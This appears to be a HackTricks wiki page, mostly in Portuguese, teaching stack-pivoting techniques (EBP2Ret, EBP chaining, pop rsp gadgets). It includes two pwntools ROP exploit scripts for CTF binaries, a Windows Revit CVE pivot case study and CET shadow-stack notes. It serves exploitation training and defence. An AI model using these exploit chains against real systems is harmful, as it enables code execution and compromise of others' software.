# Stack Pivoting - EBP2Ret - EBP chaining

{{#include ../../banners/hacktricks-training.md}}

## Informações Básicas

Esta técnica explora a capacidade de manipular o **Ponteiro Base (EBP/RBP)** para encadear a execução de múltiplas funções através do uso cuidadoso do ponteiro de quadro (frame pointer) e da sequência de instruções **`leave; ret`**.

Como lembrete, em x86/x86-64 a instrução **`leave`** é equivalente a:
```
mov       rsp, rbp   ; mov esp, ebp on x86
pop       rbp        ; pop ebp on x86
ret
```
E como o salvo **EBP/RBP está na stack** antes do EIP/RIP salvo, é possível controlá‑lo controlando a stack.

> Notas
> - Em 64-bit, substitua EBP→RBP e ESP→RSP. A semântica é a mesma.
> - Alguns compiladores omitem o frame pointer (veja “EBP might not be used”). Nesse caso, `leave` pode não aparecer e essa técnica não funcionará.

### EBP2Ret

Esta técnica é particularmente útil quando você pode **alterar o EBP/RBP salvo mas não tem forma direta de mudar o EIP/RIP**. Ela explora o comportamento do epílogo da função.

Se, durante a execução de `fvuln`, você conseguir injetar um **EBP falso** na stack que aponte para uma área na memória onde seu endereço de shellcode/ROP chain está localizado (mais 8 bytes on amd64 / 4 bytes on x86 para contabilizar o `pop`), você pode controlar indiretamente o RIP. À medida que a função retorna, `leave` define RSP para o local criado e o subsequente `pop rbp` decrementa RSP, **fazendo com que ele aponte efetivamente para um endereço armazenado pelo atacante ali**. Então `ret` usará esse endereço.

Repare que você **precisa conhecer 2 endereços**: o endereço para o qual ESP/RSP vai apontar, e o valor armazenado nesse endereço que `ret` consumirá.

#### Construção do Exploit

Primeiro você precisa saber um **endereço onde pode escrever dados/endereços arbitrários**. RSP apontará para aqui e **consumirá o primeiro `ret`**.

Então, você precisa escolher o endereço usado por `ret` que **transferirá a execução**. Você pode usar:

- Um endereço válido de [**ONE_GADGET**](https://github.com/david942j/one_gadget).
- O endereço de **`system()`** seguido pelo retorno e argumentos apropriados (on x86: `ret` target = `&system`, then 4 junk bytes, then `&"/bin/sh"`).
- O endereço de um gadget **`jmp esp;`** ([**ret2esp**](../rop-return-oriented-programing/ret2esp-ret2reg.md)) seguido de shellcode inline.
- Uma cadeia [**ROP**](../rop-return-oriented-programing/index.html) colocada em memória gravável.

Lembre-se que antes de qualquer um desses endereços na área controlada, deve haver **espaço para o `pop ebp/rbp`** do `leave` (8B on amd64, 4B on x86). Você pode abusar desses bytes para definir um **segundo EBP falso** e manter o controle após a primeira chamada retornar.

#### Off-By-One Exploit

Há uma variante usada quando você pode **apenas modificar o byte menos significativo do EBP/RBP salvo**. Nesse caso, a localização de memória que armazena o endereço para o qual saltar com **`ret`** deve compartilhar os primeiros três/cinco bytes com o EBP/RBP original para que uma sobrescrita de 1 byte possa redirecioná‑lo. Normalmente o byte baixo (offset 0x00) é incrementado para saltar o mais longe possível dentro de uma página/região alinhada próxima.

Também é comum usar um RET sled na stack e colocar a cadeia ROP real no fim para aumentar a probabilidade de que o novo RSP aponte para dentro do sled e a cadeia ROP final seja executada.

### EBP Chaining

Colocando um endereço controlado no slot `EBP` salvo da stack e um gadget `leave; ret` em `EIP/RIP`, é possível **mover o ESP/RSP para um endereço controlado pelo atacante**.

Agora `RSP` está controlado e a próxima instrução é `ret`. Coloque na memória controlada algo como:

- `&(next fake EBP)` -> Carregado por `pop ebp/rbp` do `leave`.
- `&system()` -> Chamado por `ret`.
- `&(leave;ret)` -> Após `system` terminar, move RSP para o próximo EBP falso e continua.
- `&("/bin/sh")` -> Argumento para `system`.

Dessa forma é possível encadear vários EBPs falsos para controlar o fluxo do programa.

Isto é semelhante a um [ret2lib](../rop-return-oriented-programing/ret2lib/index.html), mas mais complexo e útil apenas em casos limite.

Além disso, aqui você tem um [**example of a challenge**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/leave) que usa esta técnica com um **stack leak** para chamar uma função vencedora. Este é o payload final da página:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
0x0,               # rbp (could be the address of another fake RBP)
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,
elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (reach saved RBP)

payload += flat(
buffer,         # Load leaked address in RBP
LEAVE_RET       # Use leave to move RSP to the user ROP chain and ret to execute it
)

pause()
p.sendline(payload)
print(p.recvline())
```
> amd64 alignment tip: System V ABI requires 16-byte stack alignment at call sites. If your chain calls functions like `system`, add an alignment gadget (e.g., `ret`, or `sub rsp, 8 ; ret`) before the call to maintain alignment and avoid `movaps` crashes.

## EBP pode não ser usado

Como [**explicado neste post**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#off-by-one-1), se um binário for compilado com algumas otimizações ou com omissão do frame-pointer, o **EBP/RBP nunca controla o ESP/RSP**. Portanto, qualquer exploit que funcione controlando EBP/RBP falhará porque o prólogo/epílogo não restaura a partir do frame pointer.

- Não otimizado / frame pointer usado:
```bash
push   %ebp         # save ebp
mov    %esp,%ebp    # set new ebp
sub    $0x100,%esp  # increase stack size
.
.
.
leave               # restore ebp (leave == mov %ebp, %esp; pop %ebp)
ret                 # return
```
- Otimizado / frame pointer omitido:
```bash
push   %ebx         # save callee-saved register
sub    $0x100,%esp  # increase stack size
.
.
.
add    $0x10c,%esp  # reduce stack size
pop    %ebx         # restore
ret                 # return
```
No amd64 você frequentemente verá `pop rbp ; ret` em vez de `leave ; ret`, mas se o frame pointer for omitido completamente então não há um epílogo baseado em `rbp` pelo qual pivotar.

## Outras maneiras de controlar RSP

### `pop rsp` gadget

[**In this page**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp) você encontra um exemplo usando essa técnica. Para esse challenge era necessário chamar uma função com 2 argumentos específicos, havia um **`pop rsp` gadget** e existe um **leak from the stack**:
```python
# Code from https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp
# This version has added comments

from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16) # Leak from the stack indicating where is the input of the user
log.success(f'Buffer: {hex(buffer)}')

POP_CHAIN = 0x401225       # pop all of: RSP, R13, R14, R15, ret
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229     # pop RSI and R15

# The payload starts
payload = flat(
0,                 # r13
0,                 # r14
0,                 # r15
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,               # r15
elf.sym['winner']
)

payload = payload.ljust(104, b'A')     # pad to 104

# Start popping RSP, this moves the stack to the leaked address and
# continues the ROP chain in the prepared payload
payload += flat(
POP_CHAIN,
buffer             # rsp
)

pause()
p.sendline(payload)
print(p.recvline())
```
### xchg <reg>, rsp gadget
```
pop <reg>                <=== return pointer
<reg value>
xchg <reg>, rsp
```
### jmp esp

Veja a técnica ret2esp aqui:


{{#ref}}
../rop-return-oriented-programing/ret2esp-ret2reg.md
{{#endref}}

### Encontrando pivot gadgets rapidamente

Use seu gadget finder favorito para procurar por pivot primitives clássicas:

- `leave ; ret` em funções ou em bibliotecas
- `pop rsp` / `xchg rax, rsp ; ret`
- `add rsp, <imm> ; ret` (ou `add esp, <imm> ; ret` no x86)

Exemplos:
```bash
# Ropper
ropper --file ./vuln --search "leave; ret"
ropper --file ./vuln --search "pop rsp"
ropper --file ./vuln --search "xchg rax, rsp ; ret"

# ROPgadget
ROPgadget --binary ./vuln --only "leave|xchg|pop rsp|add rsp"
```
### Classic pivot staging pattern

Uma estratégia de pivot robusta usada em muitos CTFs/exploits:

1) Use um pequeno overflow inicial para chamar `read`/`recv` em uma grande região gravável (por exemplo, `.bss`, heap, ou memória mapeada RW) e coloque aí uma cadeia ROP completa.
2) Retorne para um pivot gadget (`leave ; ret`, `pop rsp`, `xchg rax, rsp ; ret`) para mover RSP para essa região.
3) Continue com a cadeia staged (por exemplo, leak libc, chamar `mprotect`, depois `read` shellcode e saltar para ele).

### Windows: Destructor-loop weird-machine pivots (Revit RFA case study)

Parsers client-side às vezes implementam loops de destrutores que chamam indiretamente um ponteiro de função derivado de campos de objetos controlados pelo atacante. Se cada iteração oferece exatamente uma chamada indireta (uma máquina “one-gadget”), você pode converter isso em um stack pivot confiável e entrada ROP.

Observado na desserialização do Autodesk Revit RFA (CVE-2025-5037):

- Objetos forjados do tipo `AString` colocam um ponteiro para bytes do atacante no offset 0.
- O loop de destrutores executa efetivamente um gadget por objeto:
```asm
rcx = [rbx]              ; object pointer (AString*)
rax = [rcx]              ; pointer to controlled buffer
call qword ptr [rax]     ; execute [rax] once per object
```
Dois pivôs práticos:

- Windows 10 (32-bit heap addrs): misaligned “monster gadget” que contém `8B E0` → `mov esp, eax`, eventualmente `ret`, para pivotar do call primitive para uma heap-based ROP chain.
- Windows 11 (full 64-bit addrs): usar dois objetos para conduzir um constrained weird-machine pivot:
- Gadget 1: `push rax ; pop rbp ; ret` (mover o rax original para rbp)
- Gadget 2: `leave ; ... ; ret` (torna-se `mov rsp, rbp ; pop rbp ; ret`), pivotando para o buffer do primeiro objeto, onde segue uma ROP chain convencional.

Dicas para Windows x64 após o pivot:

- Respeite o 0x20-byte shadow space e mantenha alinhamento de 16 bytes antes dos pontos de `call`. Frequentemente é conveniente posicionar literais acima do endereço de retorno e usar um gadget como `lea rcx, [rsp+0x20] ; call rax` seguido de `pop rax ; ret` para passar endereços de stack sem corromper o fluxo de controle.
- Non-ASLR helper modules (se presentes) fornecem pools de gadgets estáveis e imports tais como `LoadLibraryW`/`GetProcAddress` para resolver dinamicamente alvos como `ucrtbase!system`.
- Creating missing gadgets via a writable thunk: se uma sequência promissora terminar em um `call` através de um ponteiro de função gravável (por exemplo, DLL import thunk ou function pointer em .data), sobrescreva esse ponteiro com um single-step benigno como `pop rax ; ret`. A sequência então se comporta como se terminasse com `ret` (e.g., `mov rdx, rsi ; mov rcx, rdi ; ret`), o que é inestimável para carregar os registos de argumento do Windows x64 sem clobberar outros.

Para construção completa da cadeia e exemplos de gadgets, veja a referência abaixo.

## Modern mitigations that break stack pivoting (CET/Shadow Stack)

CPUs x86 modernas e OSes vêm cada vez mais adotando **CET Shadow Stack (SHSTK)**. Com SHSTK habilitado, `ret` compara o endereço de retorno na stack normal com uma shadow stack protegida por hardware; qualquer discrepância dispara uma Control-Protection fault e encerra o processo. Portanto, técnicas como EBP2Ret/leave;ret-based pivots irão travar assim que o primeiro `ret` for executado a partir de uma stack pivotada.

- For background and deeper details see:


{{#ref}}
../common-binary-protections-and-bypasses/cet-and-shadow-stack.md
{{#endref}}

- Verificações rápidas no Linux:
```bash
# 1) Is the binary/toolchain CET-marked?
readelf -n ./binary | grep -E 'x86.*(SHSTK|IBT)'

# 2) Is the CPU/kernel capable?
grep -E 'user_shstk|ibt' /proc/cpuinfo

# 3) Is SHSTK active for this process?
grep -E 'x86_Thread_features' /proc/$$/status   # expect: shstk (and possibly wrss)

# 4) In pwndbg (gdb), checksec shows SHSTK/IBT flags
(gdb) checksec
```
- Notas para labs/CTF:
- Algumas distros modernas habilitam SHSTK para binários compatíveis com CET quando o hardware e o glibc oferecem suporte. Para testes controlados em VMs, o SHSTK pode ser desabilitado globalmente via o parâmetro de boot do kernel `nousershstk`, ou habilitado seletivamente via tunables do glibc durante a inicialização (veja referências). Não desabilite mitigações em alvos de produção.
- JOP/COOP or SROP-based techniques might still be viable on some targets, but SHSTK specifically breaks `ret`-based pivots.
- Nota Windows: Windows 10+ exposes user-mode and Windows 11 adds kernel-mode “Hardware-enforced Stack Protection” built on shadow stacks. CET-compatible processes prevent stack pivoting/ROP at `ret`; developers opt-in via CETCOMPAT and related policies (see reference).

## ARM64

In ARM64, the **prologue and epilogues** of the functions **don't store and retrieve the SP register** in the stack. Moreover, the **`RET`** instruction doesn't return to the address pointed by SP, but **to the address inside `x30`**.

Therefore, by default, just abusing the epilogue you **won't be able to control the SP register** by overwriting some data inside the stack. And even if you manage to control the SP you would still need a way to **control the `x30`** register.

- prologue

```armasm
sub sp, sp, 16
stp x29, x30, [sp]      // [sp] = x29; [sp + 8] = x30
mov x29, sp             // FP points to frame record
```

- epilogue

```armasm
ldp x29, x30, [sp]      // x29 = [sp]; x30 = [sp + 8]
add sp, sp, 16
ret
```

> [!CAUTION]
> The way to perform something similar to stack pivoting in ARM64 would be to be able to **control the `SP`** (by controlling some register whose value is passed to `SP` or because for some reason `SP` is taking its address from the stack and we have an overflow) and then **abuse the epilogue** to load the **`x30`** register from a **controlled `SP`** and **`RET`** to it.

Also in the following page you can see the equivalent of **Ret2esp em ARM64**:


{{#ref}}
../rop-return-oriented-programing/ret2esp-ret2reg.md
{{#endref}}

## Referências

- [https://bananamafia.dev/post/binary-rop-stackpivot/](https://bananamafia.dev/post/binary-rop-stackpivot/)
- [https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)
- [https://guyinatuxedo.github.io/17-stack_pivot/dcquals19_speedrun4/index.html](https://guyinatuxedo.github.io/17-stack_pivot/dcquals19_speedrun4/index.html)
- 64 bits, exploração off-by-one com uma rop chain começando com um ret sled
- [https://guyinatuxedo.github.io/17-stack_pivot/insomnihack18_onewrite/index.html](https://guyinatuxedo.github.io/17-stack_pivot/insomnihack18_onewrite/index.html)
- 64 bit, no relro, canary, nx and pie. The program grants a leak for stack or pie and a WWW of a qword. First get the stack leak and use the WWW to go back and get the pie leak. Then use the WWW to create an eternal loop abusing `.fini_array` entries + calling `__libc_csu_fini` ([more info here](../arbitrary-write-2-exec/www2exec-.dtors-and-.fini_array.md)). Abusing this "eternal" write, it's written a ROP chain in the .bss and end up calling it pivoting with RBP.
- Documentação do kernel Linux: Control-flow Enforcement Technology (CET) Shadow Stack — detalhes sobre SHSTK, `nousershstk`, flags em `/proc/$PID/status` e habilitação via `arch_prctl`. https://www.kernel.org/doc/html/next/x86/shstk.html
- Microsoft Learn: Kernel Mode Hardware-enforced Stack Protection (CET shadow stacks on Windows). https://learn.microsoft.com/en-us/windows-server/security/kernel-mode-hardware-stack-protection
- [Crafting a Full Exploit RCE from a Crash in Autodesk Revit RFA File Parsing (ZDI blog)](https://www.thezdi.com/blog/2025/10/6/crafting-a-full-exploit-rce-from-a-crash-in-autodesk-revit-rfa-file-parsing)

{{#include ../../banners/hacktricks-training.md}}
